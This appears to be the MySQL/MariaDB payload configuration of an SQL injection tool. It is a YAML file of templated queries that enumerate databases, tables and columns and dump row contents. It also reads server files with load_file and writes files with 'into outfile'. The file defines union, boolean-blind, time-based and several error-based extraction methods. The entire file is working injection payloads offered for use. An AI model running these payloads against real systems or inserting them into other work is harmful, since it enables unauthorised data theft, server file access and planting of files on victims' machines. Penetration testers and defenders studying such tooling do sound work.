vendor: MySQL

resource:
 info: |
   concat(
       concat_ws(
           ${enclose_value_hex},
           version(),
           database(),
           user()
       ),
       ${trail_hex}
   )

 schema:
  database: |
   select concat(
       ifnull(
           group_concat(
               ${enclose_value_hex},
               r,
               ${separator_qte_hex},
               q,
               ${enclose_value_hex}
               order by r
               separator ${separator_cell_hex}
           ),
           ${trail_hex}
       ),
       ${trail_hex}
   ) from (
       select
           cast(SCHEMA_NAME as char) r,
           cast(count(TABLE_NAME) as char) q
       from INFORMATION_SCHEMA.tables
       right join INFORMATION_SCHEMA.schemata
       on SCHEMA_NAME = table_schema
       group by r
       ${limit}
   ) x

  table: |
   select concat(
       group_concat(
           ${enclose_value_hex},
           r,
           ${separator_qte_hex},
           q,
           ${enclose_value_hex}
           order by r
           separator ${separator_cell_hex}
       ),
       ${trail_hex}
   ) from (
       select
           cast(TABLE_NAME as char) r,
           cast(ifnull(table_rows, 0x30) as char) q
       from information_schema.tables
       where TABLE_SCHEMA = 0x${database.hex}
       order by r
       ${limit}
   ) x

  column: |
   select concat(
       group_concat(
           ${enclose_value_hex},
           n,
           ${separator_qte_hex},
           0,
           ${enclose_value_hex}
           order by n
           separator ${separator_cell_hex}
       ),
       ${trail_hex}
   ) from (
       select cast(COLUMN_NAME as char) n
       from information_schema.columns
       where TABLE_SCHEMA = 0x${database.hex}
       and TABLE_NAME = 0x${table.hex}
       order by n
       ${limit}
   ) x

  row:
   query: |
    select concat(
        group_concat(
            ${enclose_value_hex},
            r,
            ${separator_qte_hex},
            q,
            ${enclose_value_hex}
            order by r
            separator ${separator_cell_hex}
        ),
        ${trail_hex}
    ) from (
        select
            cast(concat(${fields}) as char) r,
            cast(count(*) as char) q
        from `${database}`.`${table}`
        group by r
        ${limit}
    ) x
   fields:
    field: trim(ifnull(`${field.value}`, 0x20))
    concat: ",0x7f,"

 zipped:
  database: |
   select concat(
       ${enclose_value_hex},
       cast(SCHEMA_NAME as char),
       '${separator_qte_sql}0${enclose_value_sql}${separator_cell_sql}${trail_sql}'
   )
   from INFORMATION_SCHEMA.schemata
   ${limit}

  table: |
   select concat(
       ${enclose_value_hex},
       cast(TABLE_NAME as char),
       '${separator_qte_sql}0${enclose_value_sql}${separator_cell_sql}${trail_sql}'
   )
   from information_schema.tables
   where TABLE_SCHEMA = 0x${database.hex}
   ${limit}

  column: |
   select concat(
       ${enclose_value_hex},
       cast(COLUMN_NAME as char),
       '${separator_qte_sql}0${enclose_value_sql}${separator_cell_sql}${trail_sql}'
   )
   from information_schema.columns
   where TABLE_SCHEMA = 0x${database.hex}
   and TABLE_NAME = 0x${table.hex}
   ${limit}

  row:
   query: |
          select concat(
              ${enclose_value_hex},
              cast(concat(${fields}) as char),
              '${separator_qte_sql}0${enclose_value_sql}${separator_cell_sql}${trail_sql}'
          )
          from `${database}`.`${table}`
          ${limit}
   fields:
    field: trim(ifnull(`${field.value}`, 0x20))
    concat: ",0x7f,"

 dios:
  database: |
   select concat(@:=0,(select count(*) from (
       select concat(
           ${enclose_value_hex},
           cast(SCHEMA_NAME as char),
           '${separator_qte_sql}0${enclose_value_sql}${separator_cell_sql}'
       ) a
       from INFORMATION_SCHEMA.schemata
   )x where @ :=concat(@,a) ${limit}), @, '${trail_sql}')

  table: |
   select concat(@:=0,(select count(*) from (
       select concat(
           ${enclose_value_hex},
           cast(TABLE_NAME as char),
           '${separator_qte_sql}0${enclose_value_sql}${separator_cell_sql}'
       ) a
       from information_schema.tables
       where TABLE_SCHEMA = 0x${database.hex}
   )x where @ :=concat(@,a) ${limit}), @, '${trail_sql}')

  column: |
   select concat(@:=0,(select count(*) from (
       select concat(
           ${enclose_value_hex},
           cast(COLUMN_NAME as char),
           '${separator_qte_sql}0${enclose_value_sql}${separator_cell_sql}'
       ) a
       from information_schema.columns
       where TABLE_SCHEMA = 0x${database.hex}
       and TABLE_NAME = 0x${table.hex}
   )x where @ :=concat(@,a) ${limit}), @, '${trail_sql}')

  row:
   query: |
          select concat(@:=0,(select count(*) from (
              select concat(
                  ${enclose_value_hex},
                  cast(concat(${fields}) as char),
                  '${separator_qte_sql}0${enclose_value_sql}${separator_cell_sql}'
              ) a
              from `${database}`.`${table}`
          )x where @ :=concat(@,a) ${limit}), @, '${trail_sql}')
   fields:
    field: trim(ifnull(`${field.value}`, 0x20))
    concat: ",0x7f,"

 file:
  privilege: |
   cast(
       concat(
           (
               select if(count(*) = 1, 0x74727565, 0x66616c7365)
               from INFORMATION_SCHEMA.USER_PRIVILEGES
               where grantee = concat(0x27, replace(cast(current_user as char), 0x40, 0x274027), 0x27)
               and PRIVILEGE_TYPE = 0x46494c45
           ),
           ${trail_hex}
       )
       as char
   )
  read: cast(concat(load_file(0x${filepath.hex}), ${trail_hex}) as char)
  create:
   content: (select 0x${content.hex})
   query: into outfile "${filepath}"

strategy:
 configuration:
  slidingWindow: |
   (
       select
           concat(
               ${lead_hex},
               mid(
                   (${injection}),
                   ${window.char},
                   ${capacity}
               )
           )
   )
  limit: limit ${limit.value}, 65536
  failsafe: 1337${indice}7330%2b1
  calibrator: repeat(${calibrator_hex}, 65536)
  limitBoundary: 0
  # Encoded space mandatory to avoid space cleaning
  # TODO keep raw space
  # endingComment: --+-
  # pentesterlab does not work with --+-, switch to #
  endingComment: '%23'
  fingerprint:
   errorMessage:
    - You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near
    - MySQL
    - You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near
    - MariaDB

 normal:
  indices: union select ${indices}
  capacity: |
   (
       select concat(
           ${lead_hex},
           ${indice},
           ${calibrator}
       )
   )
  orderBy: order by 1337

 boolean:
  test:
   falses:
    - true = false
    - true %21= true
    - false %21= false
    - 1 = 2
    - 1 %21= 1
    - 2 %21= 2
   trues:
    - true = true
    - false = false
    - true %21= false
    - 1 = 1
    - 2 = 2
    - 1 %21= 2
   initialization: 0%2b1 = 1
   bit: |
    ascii(
        substring(
            ${injection},
            ${window.char},
            1
        )
    )
    %26 ${bit}
   length: char_length(${injection}) > ${window.char}
  modeAnd: and
  modeOr: or
  blind: ${boolean.mode} ${test}
  time: |
   ${boolean.mode} if(
       ${test},
       1,
       SLEEP(${sleep_time})
   )

 error:
  method:
  
   - name: BIGINT::exp:OR
     query: |
      or !(
          select *
          from (
              ${window}
          ) x
      )-~0
     capacity: 453
     
   - name: BIGINT::exp:AND
     query: |
      and !(
          select *
          from (
              ${window}
          ) x
      )-~0
     capacity: 453

   - name: BIGINT::exp in Order By
     query: |
      1, (
          select 1
          from (
              select !(
                  select *
                  from (
                      ${window}
                  ) x
              )-~0
          ) x
      )
     capacity: 453

   - name: BIGINT::exp:OR in Delete Insert Update
     query: |
      ' or (
          select !(
              select *
              from (
                  ${window}
              ) x
          )-~0
      ) or '
     capacity: 453

   - name: BIGINT::exp:AND in Delete Insert Update
     query: |
      ' and (
          select !(
              select *
              from (
                  ${window}
              ) x
          )-~0
      ) or '
     capacity: 453

   - name: DOUBLE::exp:OR
     query: |
      or 1 = exp(
          ~(
              select *
              from (
                  ${window}
              ) x
          )
      )
     capacity: 462

   - name: DOUBLE::exp:AND
     query: |
      and 1 = exp(
          ~(
              select *
              from (
                  ${window}
              ) x
          )
      )
     capacity: 462

   - name: DOUBLE::exp in Order By
     query: |
      1, (
          select exp(
              ~(
                  select *
                  from (
                      ${window}
                  ) x
              )
          )
      )
     capacity: 462

   - name: DOUBLE::exp:OR in Delete Insert Update
     query: |
      ' or (
          select exp(
              ~(
                  select *
                  from (
                      ${window}
                  ) x
              )
          )
      ) or '
     capacity: 462

   - name: DOUBLE::exp:AND in Delete Insert Update
     query: |
      ' and (
          select exp(
              ~(
                  select *
                  from (
                      ${window}
                  ) x
              )
          )
      ) or '
     capacity: 462

   - name: GROUPBY::rand:OR
     query: |
      or exists(
          select
              count(*),
              concat(
                  (${window}),
                  floor(rand(0)*2)
              )
          from information_schema.tables
          group by 2
      )
     capacity: 64

   - name: GROUPBY::rand:AND
     query: |
      and exists(
          select
              count(*),
              concat(
                  (${window}),
                  floor(rand(0)*2)
              )
          from information_schema.tables
          group by 2
      )
     capacity: 64

   - name: GROUPBY::rand in Order By
     query: |
      1, (
          select 1 from (
              select
                  count(*),
                  concat(
                      (${window}),
                      floor(rand(0)*2)
                  )
              from information_schema.tables
              group by 2
          ) x
      )
     capacity: 64

   - name: GROUPBY::rand:OR in Delete Insert Update
     query: |
      ' or (
          select 1 from (
              select
                  count(*),
                  concat(
                      (${window}),
                      floor(rand(0)*2)
                  )
              from information_schema.tables
              group by 2
          ) x
      ) or '
     capacity: 64

   - name: GROUPBY::rand:AND in Delete Insert Update
     query: |
      ' and (
          select 1 from (
              select
                  count(*),
                  concat(
                      (${window}),
                      floor(rand(0)*2)
                  )
              from information_schema.tables
              group by 2
          ) x
      ) or '
     capacity: 64

   - name: JSON::json_keys:OR
     query: |
      or 1 = (
          select JSON_KEYS (
              (
                  select *
                  from (
                      ${window}
                  ) x
              )
          )
      )
     capacity: 64

   - name: JSON::json_keys:AND
     query: |
      and 1 = (
          select JSON_KEYS (
              (
                  select *
                  from (
                      ${window}
                  ) x
              )
          )
      )
     capacity: 64

   - name: JSON::json_keys in Order By
     query: |
      /* Require FALSE statement, then OR */
      1, (
          select JSON_KEYS (
              (
                  select *
                  from (
                      ${window}
                  ) x
              )
          )
      )
     capacity: 64

   - name: JSON::json_keys:OR in Delete Insert Update
     query: |
      ' or (
          select JSON_KEYS (
              (
                  select *
                  from (
                      ${window}
                  ) x
              )
          )
      ) or '
     capacity: 64

   - name: JSON::json_keys:AND in Delete Insert Update
     query: |
      ' and (
          select JSON_KEYS (
              (
                  select *
                  from (
                      ${window}
                  ) x
              )
          )
      ) or '
     capacity: 64

   # extractvalue() interpreted whatever :OR :AND
   - name: XML::extractvalue
     query: |
      or 1 = extractvalue(
          0x0a,
          concat(
              0x0a,
              (${window})
          )
      )
     capacity: 31

   - name: XML::extractvalue in Order By
     query: |
      1, (
          select 1 from (
              select extractvalue(
                  0x0a,
                  concat(
                      0x0a,
                      (${window})
                  )
              )
          ) x
      )
     capacity: 31

   # extractvalue() interpreted whatever :OR :AND
   - name: XML::extractvalue in Delete Insert Update
     query: |
      ' or (
          select 1 from (
              select extractvalue(
                  0x0a,
                  concat(
                      0x0a,
                      (${window})
                  )
              )
          ) x
      ) or '
     capacity: 31

   - name: BIGINT::if:OR
     query: |
      or 1 = (SELECT 2*IF((SELECT * FROM 
          (${window})x
      ), 4611686018427387904, 4611686018427387904))
     capacity: 460

   - name: BIGINT::if:AND
     query: |
      and 1 = (SELECT 2*IF((SELECT * FROM 
          (${window})x
      ), 4611686018427387904, 4611686018427387904))
     capacity: 460

   - name: BIGINT::if in Order By
     query: |
      1, (SELECT 2*IF((SELECT * FROM 
          (${window})x
      ), 4611686018427387904, 4611686018427387904))
     capacity: 460

   - name: BIGINT::if:OR in Delete Insert Update
     query: |
      ' or (SELECT 2*IF((SELECT * FROM 
          (${window})x
      ), 4611686018427387904, 4611686018427387904)) or '
     capacity: 460

   - name: BIGINT::if:AND in Delete Insert Update
     query: |
      ' and (SELECT 2*IF((SELECT * FROM 
          (${window})x
      ), 4611686018427387904, 4611686018427387904)) or '
     capacity: 460